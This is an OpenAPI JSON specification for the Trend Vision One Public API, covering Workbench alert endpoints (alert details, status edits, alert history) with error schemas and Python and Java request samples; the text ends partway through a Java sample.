{
  "info": {
    "description": "\n<style>\n.notice-permission {\n    background-color: #eeeeee;\n    border: 1px solid #cccccc;\n    padding: 8px 16px 0 16px;\n    font-size: 12px;\n}\n</style>\n\n\nTrend Vision One Public API\n",
    "license": {
      "name": "Copyright Â© 2025 Trend Micro Incorporated. All rights reserved.",
      "url": "https://www.trendmicro.com"
    },
    "title": "Trend Vision One Public API",
    "version": "v2.0"
  },
  "openapi": "3.0.1",
  "servers": [
    {
      "url": "https://api.xdr.trendmicro.com",
      "description": "United States"
    },
    {
      "url": "https://api.eu.xdr.trendmicro.com",
      "description": "European Union"
    },
    {
      "url": "https://api.sg.xdr.trendmicro.com",
      "description": "Singapore"
    },
    {
      "url": "https://api.xdr.trendmicro.co.jp",
      "description": "Japan"
    },
    {
      "url": "https://api.au.xdr.trendmicro.com",
      "description": "Australia"
    },
    {
      "url": "https://api.in.xdr.trendmicro.com",
      "description": "India"
    },
    {
      "url": "https://api.mea.xdr.trendmicro.com",
      "description": "United Arab Emirates"
    }
  ],
  "security": [
    {
      "bearerAuth": []
    }
  ],
  "tags": [
    {
      "name": "Accounts (Legacy)"
    },
    {
      "name": "Alerts"
    },
    {
      "name": "Audit Logs"
    },
    {
      "name": "Common"
    },
    {
      "name": "Details"
    },
    {
      "name": "Detection Models"
    },
    {
      "name": "Email"
    },
    {
      "name": "Endpoint"
    },
    {
      "name": "Intelligence Reports"
    },
    {
      "name": "Notifications"
    },
    {
      "name": "Notes"
    },
    {
      "name": "On-Premises"
    },
    {
      "name": "Observed Attack Techniques"
    },
    {
      "name": "Password"
    },
    {
      "name": "Roles (Legacy)"
    },
    {
      "name": "SaaS"
    },
    {
      "name": "SAML"
    },
    {
      "name": "Sandbox Analysis"
    },
    {
      "name": "Search"
    },
    {
      "name": "Splunk"
    },
    {
      "name": "Suspicious Object Exception List"
    },
    {
      "name": "Suspicious Object List"
    },
    {
      "name": "Two-Factor Authentication"
    },
    {
      "name": "Webhooks"
    }
  ],
  "x-tagGroups": [
    {
      "name": "Accounts",
      "tags": [
        "Accounts (Legacy)",
        "Password",
        "Roles (Legacy)",
        "Two-Factor Authentication"
      ]
    },
    {
      "name": "Alerts / Workbench",
      "tags": [
        "Alerts",
        "Details",
        "Detection Models",
        "Notes"
      ]
    },
    {
      "name": "Audit Logs",
      "tags": [
        "Audit Logs"
      ]
    },
    {
      "name": "Connected Products",
      "tags": [
        "On-Premises",
        "SaaS"
      ]
    },
    {
      "name": "Notifications",
      "tags": [
        "Notifications",
        "Webhooks"
      ]
    },
    {
      "name": "Observed Attack Techniques",
      "tags": [
        "Observed Attack Techniques"
      ]
    },
    {
      "name": "Response Actions",
      "tags": [
        "Common",
        "Email",
        "Endpoint"
      ]
    },
    {
      "name": "Single Sign-On",
      "tags": [
        "SAML"
      ]
    },
    {
      "name": "Search",
      "tags": [
        "Search"
      ]
    },
    {
      "name": "SIEM",
      "tags": [
        "Splunk"
      ]
    },
    {
      "name": "Threat Intelligence",
      "tags": [
        "Intelligence Reports",
        "Sandbox Analysis",
        "Suspicious Object Exception List",
        "Suspicious Object List"
      ]
    }
  ],
  "paths": {
    "/v2.0/xdr/workbench/workbenches/{workbenchId}": {
      "get": {
        "summary": "Get alert details",
        "description": "Retrieves information about the specified alert\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Workbench</b><br>\n  <ul>\n    <li>View, filter, and search</li>\n  </ul>\n\n</div>\n",
        "tags": [
          "Details"
        ],
        "parameters": [
          {
            "name": "workbenchId",
            "description": "Workbench ID",
            "example": "WB-14-20190709-00003",
            "in": "path",
            "required": true,
            "schema": {
              "type": "string"
            }
          }
        ],
        "responses": {
          "200": {
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/awb-WorkbenchDetails"
                },
                "examples": {
                  "saeWorkbenchDetailsExample": {
                    "$ref": "#/components/examples/awb-saeWorkbenchDetailsExample"
                  },
                  "tiWorkbenchDetailsExample": {
                    "$ref": "#/components/examples/awb-tiWorkbenchDetailsExample"
                  }
                }
              }
            }
          },
          "400": {
            "content": {
              "application/json": {
                "schema": {
                  "properties": {
                    "error": {
                      "type": "object",
                      "description": "* 3002001: Unable to retrieve workbench details. Verify that the request is properly formatted and try again. (Error code: 3002001)\n* 3002002: Unable to retrieve workbench details. Verify that the specified customer ID exists and that you have permission to access the customer's data and try again. (Error code: 3002002)\n* 3002003: Unable to retrieve workbench details. Verify that the specified workbench ID exists and that you have permission to access the workbench and try again. (Error code: 3002003)\n* 3002004: Unable to retrieve workbench details. Verify that the request parameters are valid and try again. (Error code: 3002004)\n* 3002005: Unable to retrieve workbench details. This workbench version is unsupported for workbench details. (Error code: 3002005)\n",
                      "properties": {
                        "code": {
                          "type": "string",
                          "example": "3002001",
                          "enum": [
                            "3002001",
                            "3002002",
                            "3002003",
                            "3002004",
                            "3002005"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Unable to retrieve workbench details. Verify that the request is properly formatted and try again. (Error code: 3002001)"
                        },
                        "innererror": {
                          "type": "object",
                          "properties": {
                            "code": {
                              "type": "string",
                              "example": ""
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "404": {
            "content": {
              "application/json": {
                "schema": {
                  "properties": {
                    "error": {
                      "type": "object",
                      "description": "* 3090015: False Positive Removed. Trend Micro has identified the alert as a false positive and removed it from Workbench. Please ignore the alert and proceed to other alerts (Error code: 3090015)\n",
                      "properties": {
                        "code": {
                          "type": "string",
                          "example": "3090015",
                          "enum": [
                            "3090015"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "False Positive Removed. Trend Micro has identified the alert as a false positive and removed it from Workbench. Please ignore the alert and proceed to other alerts (Error code: 3090015)"
                        },
                        "innererror": {
                          "type": "object",
                          "properties": {
                            "code": {
                              "type": "string",
                              "example": ""
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "content": {
              "application/json": {
                "schema": {
                  "properties": {
                    "error": {
                      "type": "object",
                      "description": "* 3002999: Unable to retrieve workbench details. An internal error has occurred. Please try again later. If the issue persists, contact Trend Micro Support. (Error code: 3002999)\n",
                      "properties": {
                        "code": {
                          "type": "string",
                          "example": "3002999",
                          "enum": [
                            "3002999"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Unable to retrieve workbench details. An internal error has occurred. Please try again later. If the issue persists, contact Trend Micro Support. (Error code: 3002999)"
                        },
                        "innererror": {
                          "type": "object",
                          "properties": {
                            "code": {
                              "type": "string",
                              "example": ""
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/workbench/workbenches/{workbenchId}'\nurl_path = url_path.format(**{'workbenchId': 'YOUR_WORKBENCHID'})\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.get(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/workbench/workbenches/{workbenchId}\";\n        urlPath = urlPath.replace(\"{workbenchId}\", \"YOUR_WORKBENCHID\");\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.get(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      },
      "put": {
        "summary": "Edit alert status",
        "description": "Modifies the investigation status of the specified alert\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Workbench</b><br>\n  <ul>\n    <li>Modify alert details</li>\n  </ul>\n\n</div>\n",
        "tags": [
          "Alerts"
        ],
        "parameters": [
          {
            "name": "workbenchId",
            "description": "Workbench ID",
            "example": "WB-14-20190709-00003",
            "in": "path",
            "required": true,
            "schema": {
              "type": "string"
            }
          }
        ],
        "requestBody": {
          "required": true,
          "content": {
            "application/json": {
              "schema": {
                "example": {
                  "status": 3,
                  "investigationResult": 2
                },
                "type": "object",
                "properties": {
                  "investigationStatus": {
                    "deprecated": true,
                    "type": "integer",
                    "description": "0: New, 1: In Progress, 2: Resolved: True Positive, 3: Resolved: False Positive, 4: Resolved: Benign True Positive, 5: Resolved",
                    "example": 1
                  },
                  "status": {
                    "type": "integer",
                    "description": "The status of the case or investigation. \n\nAvailable values: \n* `1` - Open\n* `2` - In Progress\n* `3` - Closed\n",
                    "example": 1
                  },
                  "investigationResult": {
                    "type": "integer",
                    "description": "The findings of a case or investigation.\n\nAvailable values: \n`0` - No findings\n`1` - Noteworthy\n`2` - True positive \n`3` - False positive\n`4` - Benign true positive\n`5` - Other findings\n",
                    "example": 0
                  }
                }
              }
            }
          }
        },
        "responses": {
          "200": {
            "description": "OK",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "properties": {
                    "info": {
                      "description": "* 3006000 - Alert status changed successfully.\n",
                      "type": "object",
                      "properties": {
                        "code": {
                          "description": "code",
                          "type": "integer",
                          "example": 3006000,
                          "enum": [
                            3006000
                          ]
                        },
                        "msg": {
                          "description": "msg",
                          "type": "string",
                          "example": "Alert status changed successfully."
                        }
                      }
                    },
                    "data": {
                      "type": "object",
                      "nullable": true,
                      "example": null
                    }
                  }
                }
              }
            }
          },
          "400": {
            "content": {
              "application/json": {
                "schema": {
                  "properties": {
                    "error": {
                      "type": "object",
                      "description": "* 3006001 - Unable to change alert status. Verify that the request is properly formatted and try again. (Error code: 3006001)\n* 3006002 - Unable to change alert status. Verify that the specified company exists and that you have permission to access the company's data and try again. (Error code: 3006002)\n* 3006003 - Unable to change alert status. Verify that all requested workbench IDs exist and try again. (Error code: 3006003)\n",
                      "properties": {
                        "code": {
                          "type": "string",
                          "example": "3006001",
                          "enum": [
                            "3006001",
                            "3006002",
                            "3006003"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Unable to change alert status. Verify that the request is properly formatted and try again. (Error code: 3006001)"
                        },
                        "innererror": {
                          "type": "object",
                          "properties": {
                            "code": {
                              "type": "string",
                              "example": ""
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "$ref": "#/components/responses/awb-CommonErrors500"
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/workbench/workbenches/{workbenchId}'\nurl_path = url_path.format(**{'workbenchId': 'YOUR_WORKBENCHID'})\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token,\n    'Content-Type': 'application/json;charset=utf-8'\n}\nbody = {\n    'status': 'YOUR_STATUS (integer)',\n    'investigationResult': 'YOUR_INVESTIGATIONRESULT (integer)'\n}\n\nr = requests.put(url_base + url_path, params=query_params, headers=headers, json=body)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/workbench/workbenches/{workbenchId}\";\n        urlPath = urlPath.replace(\"{workbenchId}\", \"YOUR_WORKBENCHID\");\n        String token = \"YOUR_TOKEN\";\n\n        String requestyBody = \n                \"{\" +\n                \"    \\\"status\\\": \\\"YOUR_STATUS (integer)\\\",\" +\n                \"    \\\"investigationResult\\\": \\\"YOUR_INVESTIGATIONRESULT (integer)\\\"\" +\n                \"}\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.put(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .addHeader(\"Content-Type\", \"application/json;charset=utf-8\")\n                .setEntity(requestyBody, ContentType.APPLICATION_JSON)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/workbench/workbenches/history": {
      "post": {
        "summary": "Get alert history",
        "description": "Displays a list of your Workbench alerts in a paginated list\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Workbench</b><br>\n  <ul>\n    <li>View, filter, and search</li>\n  </ul>\n\n</div>\n",
        "tags": [
          "Alerts"
        ],
        "parameters": [],
        "requestBody": {
          "required": true,
          "content": {
            "application/json": {
              "schema": {
                "type": "object",
                "properties": {
                  "startTime": {
                    "type": "string",
                    "pattern": "^[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}:[0-9]{2}:[0-9]{2}\\.[0-9]{3}Z$",
                    "example": "2019-11-01T10:23:55.000Z"
                  },
                  "endTime": {
                    "type": "string",
                    "pattern": "^[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}:[0-9]{2}:[0-9]{2}\\.[0-9]{3}Z$",
                    "example": "2019-11-01T10:23:55.000Z"
                  },
                  "investigationStatus": {
                    "deprecated": true,
                    "description": "The current status of the alert or investigation triggered in Workbench. You can specify multiple statuses separated by commas. \n\nAvailable statuses:\n* `0` - New\n* `1` - In Progress\n* `2` - Resolved: True Positive\n* `3` - Resolved: False Positive\n* `4` - Resolved: Benign True Positive\n* `5` - Resolved\n\nDefault: All\n",
                    "type": "array",
                    "nullable": true,
                    "items": {
                      "type": "integer"
                    },
                    "example": [
                      0
                    ]
                  },
                  "status": {
                    "description": "The status of a case or investigation opened from Workbench. You can specify multiple values separated by commas. \n\nAvailable values:\n* `1` - Open\n* `2` - In progress\n* `3` - Closed\n\nDefault: All\n",
                    "type": "array",
                    "nullable": true,
                    "items": {
                      "type": "integer"
                    },
                    "example": [
                      1
                    ]
                  },
                  "investigationResult": {
                    "description": "The findings of a case or investigation opened from Workbench. \n\nYou can specify multiple values separated by commas.\n\nAvailable results:\n* `0` - No findings\n* `1` - Noteworthy\n* `2` - True positive\n* `3` - False positive\n* `4` - Benign true positive\n* `5` - Other findings\n\nDefault: All\n",
                    "type": "array",
                    "nullable": true,
                    "items": {
                      "type": "integer"
                    },
                    "example": [
                      0
                    ]
                  },
                  "sortBy": {
                    "description": "Specifies the field by which the results are sorted.\n\nData is displayed in ascending order by default. To display records in descending order, prepend a hyphen (-) before the parameter name.\n\nAvailable values:\n* `investigationStatus` (deprecated)\n* `status`\n* `investigationResult`\n* `score`\n* `wbName`\n* `wbId`\n* `caseId`\n* `createdTime`\n* `severity`\n* `modelId`\n",
                    "type": "string",
                    "pattern": "^[-]?(status|investigationStatus|investigationResult|score|wbName|wbId|caseId|createdTime|severity|modelId)$",
                    "example": "-createdTime"
                  },
                  "queryTimeField": {
                    "description": "The timestamp to be used for retrieving Workbench alert data.\n\nAvailable values: \n- `updatedTime`\n- `createdTime`\n\nDefault: `createdTime`\n",
                    "type": "string",
                    "example": "createdTime"
                  },
                  "searchBy": {
                    "description": "The target field for keyword searches. \nUse both 'searchBy' and 'keyword' in combination to form a valid search query.\nPossible values:\n  * `impactScope` - Search for specific endpoint names, user accounts, email addresses, container names or cloud resource names\n  * `highlightedObjects` - Search for specific objects that triggered a detection filter\n",
                    "type": "string",
                    "enum": [
                      "impactScope",
                      "highlightedObjects"
                    ],
                    "example": "highlightedObjects"
                  },
                  "keyword": {
                    "description": "The keyword used to search for Workbench alerts.\n\nNote: The API supports partial match search.\n",
                    "type": "string",
                    "minLength": 1,
                    "maxLength": 300,
                    "example": "document.lnk"
                  },
                  "modelType": {
                    "description": "The type of detection model that triggered the alert.\nThe default value is `all`.\nAvailable values:\n  * `all` - Predefined and custom detection models\n  * `preset` - Predefined detection models\n  * `custom` - Custom detection models\n",
                    "type": "string",
                    "enum": [
                      "all",
                      "preset",
                      "custom"
                    ],
                    "example": "all"
                  },
                  "offset": {
                    "description": "Position of a particular record in the dataset. \n\nNote: `0` refers to the first record in the dataset.\n",
                    "type": "integer",
                    "minimum": 0,
                    "example": 0
                  },
                  "limit": {
                    "description": "Number of records displayed on a page.\n\nAvailable values: `50`, `100`, `200`\n",
                    "type": "integer",
                    "minimum": 1,
                    "example": 100
                  }
                },
                "required": [
                  "startTime",
                  "endTime",
                  "sortBy",
                  "offset",
                  "limit"
                ]
              }
            }
          }
        },
        "responses": {
          "200": {
            "description": "OK",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "example": {
                    "info": {
                      "code": 3008000,
                      "msg": "Retrieve workbench summary information successfully."
                    },
                    "data": {
                      "totalCount": 1,
                      "modelList": [
                        "Heartbeat Model",
                        "Possible APT Attack",
                        "Suspicious Web Access After Suspicious Email"
                      ],
                      "workbenchRecords": [
                        {
                          "investigationStatus": 0,
                          "status": 1,
                          "investigationResult": 0,
                          "priorityScore": 44,
                          "workbenchName": "[Heuristic Attribute] Autorun Registry Generated from User Information",
                          "workbenchId": "WB-9002-20220906-00021",
                          "workbenchLink": "https://THE_WORKBENCH_URL",
                          "createdTime": "2022-09-06T02:49:33Z",
                          "updatedTime": "2022-09-06T02:49:52Z",
                          "severity": "medium",
                          "modelId": "1ebd4f91-4b28-40b4-87f5-8defee4791d8",
                          "modelType": "preset",
                          "impactScope": {
                            "desktopCount": 1,
                            "serverCount": 0,
                            "accountCount": 1,
                            "emailAddressCount": 0,
                            "containerCount": 0,
                            "cloudIdentityCount": 0
                          },
                          "ownerIds": [
                            "1ebd4f91-4b28-40b4-87f5-8defee4791d8"
                          ],
                          "caseId": "CL-12345-20230718-00012"
                        }
                      ]
                    }
                  },
                  "properties": {
                    "info": {
                      "description": "* 3008000 - Retrieve workbench summary information successfully.\n",
                      "type": "object",
                      "properties": {
                        "code": {
                          "description": "code",
                          "type": "integer",
                          "example": 3008000,
                          "enum": [
                            3008000
                          ]
                        },
                        "msg": {
                          "description": "msg",
                          "type": "string",
                          "example": "Retrieve workbench summary information successfully."
                        }
                      }
                    },
                    "data": {
                      "type": "object",
                      "properties": {
                        "totalCount": {
                          "description": "Total count",
                          "type": "integer"
                        },
                        "modelList": {
                          "description": "Distinct model list of visible workbenches of the current customer",
                          "type": "array",
                          "items": {
                            "type": "string"
                          }
                        },
                        "workbenchRecords": {
                          "description": "Workbench records returned",
                          "type": "array",
                          "items": {
                            "properties": {
                              "investigationStatus": {
                                "deprecated": true,
                                "type": "integer",
                                "description": "0: New, 1: In Progress, 2: Resolved: True Positive, 3: Resolved: False Positive, 4: Resolved: Benign True Positive, 5: Resolved"
                              },
                              "status": {
                                "type": "integer",
                                "description": "The status of the case or investigation.\n\nAvailable values: \n* `1` - Open\n* `2` - In Progress\n* `3` - Closed\n"
                              },
                              "investigationResult": {
                                "type": "integer",
                                "description": "The findings of the case or investigation.\n\nAvailable values: \n`0` - No findings\n`1` - Noteworthy\n`2` - True positive \n`3` - False positive\n`4` - Benign true positive\n`5` - Other findings\n"
                              },
                              "priorityScore": {
                                "example": 60,
                                "type": "integer"
                              },
                              "workbenchName": {
                                "example": "Heartbeat Model",
                                "type": "string"
                              },
                              "workbenchId": {
                                "example": "WB-2-20200214-0003",
                                "type": "string"
                              },
                              "workbenchLink": {
                                "example": "https://THE_WORKBENCH_URL",
                                "type": "string"
                              },
                              "createdTime": {
                                "example": "2020-02-14T10:05:09Z",
                                "type": "string"
                              },
                              "updatedTime": {
                                "example": "2020-02-15T10:05:09Z",
                                "type": "string"
                              },
                              "severity": {
                                "description": "The severity of the model that triggered the alert. \n\nAvailable values:\n- `critical`\n- `high`\n- `medium`\n- `low`\n- `null` (Only when it is not possible to retrieve the severity)\n",
                                "example": "critical",
                                "type": "string"
                              },
                              "modelId": {
                                "description": "The ID of the detection model that triggered the alert",
                                "example": "1ebd4f91-4b28-40b4-87f5-8defee4791d8",
                                "type": "string"
                              },
                              "modelType": {
                                "description": "The type of detection model that triggered the alert",
                                "example": "preset, custom",
                                "type": "string",
                                "enum": [
                                  "preset",
                                  "custom"
                                ]
                              },
                              "impactScope": {
                                "type": "object",
                                "properties": {
                                  "desktopCount": {
                                    "type": "integer",
                                    "description": "Number of affected desktops"
                                  },
                                  "serverCount": {
                                    "type": "integer",
                                    "description": "Number of affected servers"
                                  },
                                  "accountCount": {
                                    "type": "integer",
                                    "description": "Number of affected accounts"
                                  },
                                  "emailAddressCount": {
                                    "type": "integer",
                                    "description": "Number of affected email addresses"
                                  },
                                  "containerCount": {
                                    "description": "Number of affected containers",
                                    "type": "integer"
                                  },
                                  "cloudIdentityCount": {
                                    "description": "Number of affected cloud resources",
                                    "type": "integer"
                                  }
                                }
                              },
                              "ownerIds": {
                                "type": "array",
                                "description": "The owners of the Workbench alert",
                                "items": {
                                  "type": "string",
                                  "example": [
                                    "6962a2ec-5960-4c3f-829d-e8f11ea0f70e"
                                  ]
                                }
                              },
                              "caseId": {
                                "type": "string",
                                "description": "The unique identifier of a case",
                                "nullable": true,
                                "example": "CL-12345-20230718-00012"
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "400": {
            "content": {
              "application/json": {
                "schema": {
                  "properties": {
                    "error": {
                      "type": "object",
                      "description": "* 3008001 - Unable to retrieve workbench summary information. Verify that the request is properly formatted and try again. (Error code: 3008001)\n* 3008002 - Unable to retrieve workbench summary information. Verify that the specified company exists and that you have permission to access the company's data and try again. (Error code: 3008002)\n",
                      "properties": {
                        "code": {
                          "type": "string",
                          "example": "3008001",
                          "enum": [
                            "3008001",
                            "3008002"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Unable to retrieve workbench summary information. Verify that the request is properly formatted and try again. (Error code: 3008001)"
                        },
                        "innererror": {
                          "type": "object",
                          "properties": {
                            "code": {
                              "type": "string",
                              "example": ""
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "content": {
              "application/json": {
                "schema": {
                  "properties": {
                    "error": {
                      "type": "object",
                      "description": "* 3008999: Unable to retrieve workbench summary information. An internal error has occurred. Please try again later. If the issue persists, contact Trend Micro Support. (Error code: 3008999)\n",
                      "properties": {
                        "code": {
                          "type": "string",
                          "example": "3008999",
                          "enum": [
                            "3008999"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Unable to retrieve workbench summary information. An internal error has occurred. Please try again later. If the issue persists, contact Trend Micro Support. (Error code: 3008999)"
                        },
                        "innererror": {
                          "type": "object",
                          "properties": {
                            "code": {
                              "type": "string",
                              "example": ""
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/workbench/workbenches/history'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token,\n    'Content-Type': 'application/json;charset=utf-8'\n}\nbody = {\n    'startTime': 'YOUR_STARTTIME (string)',\n    'endTime': 'YOUR_ENDTIME (string)',\n    'status': 'YOUR_STATUS (array)',\n    'investigationResult': 'YOUR_INVESTIGATIONRESULT (array)',\n    'sortBy': 'YOUR_SORTBY (string)',\n    'queryTimeField': 'YOUR_QUERYTIMEFIELD (string)',\n    'searchBy': 'YOUR_SEARCHBY (string)',\n    'keyword': 'YOUR_KEYWORD (string)',\n    'modelType': 'YOUR_MODELTYPE (string)',\n    'offset': 'YOUR_OFFSET (integer)',\n    'limit': 'YOUR_LIMIT (integer)'\n}\n\nr = requests.post(url_base + url_path, params=query_params, headers=headers, json=body)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/workbench/workbenches/history\";\n        String token = \"YOUR_TOKEN\";\n\n        String requestyBody = \n                \"{\" +\n                \"    \\\"startTime\\\": \\\"YOUR_STARTTIME (string)\\\",\" +\n                \"    \\\"endTime\\\": \\\"YOUR_ENDTIME (string)\\\",\" +\n                \"    \\\"status\\\": \\\"YOUR_STATUS (array)\\\",\" +\n                \"    \\\"investigationResult\\\": \\\"YOUR_INVESTIGATIONRESULT (array)\\\",\" +\n                \"    \\\"sortBy\\\": \\\"YOUR_SORTBY (string)\\\",\" +\n                \"    \\\"queryTimeField\\\": \\\"YOUR_QUERYTIMEFIELD (string)\\\",\" +\n                \"    \\\"searchBy\\\": \\\"YOUR_SEARCHBY (string)\\\",\" +\n                \"    \\\"keyword\\\": \\\"YOUR_KEYWORD (string)\\\",\" +\n                \"    \\\"modelType\\\": \\\"YOUR_MODELTYPE (string)\\\",\" +\n                \"    \\\"offset\\\": \\\"YOUR_OFFSET (integer)\\\",\" +\n                \"    \\\"limit\\\": \\\"YOUR_LIMIT (integer)\\\"\" +\n                \"}\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.post(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .addHeader(\"Content-Type\", \"application/json;charset=utf-8\")\n                .setEntity(requestyBody, ContentType.APPLICATION_JSON)\n                